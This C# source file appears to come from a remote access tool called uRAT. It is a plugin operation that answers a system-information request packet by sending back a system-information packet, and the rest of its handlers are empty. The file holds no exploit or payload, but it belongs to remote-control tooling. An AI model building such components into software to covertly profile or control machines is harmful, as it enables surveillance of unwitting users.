using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.CorePlugin.BasicSystemInformation.Packets;
using uRAT.Server;
using uRAT.Server.Tools.Extensions;

namespace uRAT.CorePlugin.BasicSystemInformation.Operations
{
    public class BasicSystemInformationOperation : SocketOperationBase
    {        
        public override int OperationId
        {
            get { return 0; }
        }

        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is SystemInformationInitPacket)
            {
                SendPacket(new SystemInformationPacket());
            }
        }

        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {

        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {

        }

        public override void Disconnected()
        {

        }
    }
}
